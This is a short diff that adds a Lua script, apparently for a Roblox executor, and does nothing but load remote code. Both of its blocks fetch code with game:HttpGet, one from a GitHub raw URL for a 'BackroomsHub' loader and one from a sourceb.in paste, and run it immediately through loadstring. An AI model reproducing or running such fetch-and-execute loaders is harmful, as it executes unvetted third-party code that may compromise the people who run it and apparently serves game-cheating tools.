@@ -1,0 +1,7 @@
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/BackroomsHub/refs/heads/main/MainLoaders"))()
+end)
+
+pcall(function()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/riFYbXjItg/0"))()
+end)
